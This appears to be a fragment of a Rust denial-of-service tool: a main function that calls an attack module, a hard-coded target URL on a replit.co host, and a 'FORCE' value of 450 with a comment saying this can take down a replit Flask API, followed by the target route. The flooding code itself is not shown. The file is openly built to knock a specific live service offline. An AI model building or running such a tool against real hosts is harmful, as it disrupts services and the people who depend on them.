mod attack;
#[tokio::main]
async fn main() {
    attack::start().await;
}

pub static ATTACK_URL: &str = "https://SecretWindingAttributes.carghai74.repl.co";

pub static FORCE: u128 = 450;
// 450 to can take down a replit flask api
// This is the code
// app.route('/hard')
// def hard_dos():
//   return "failure"
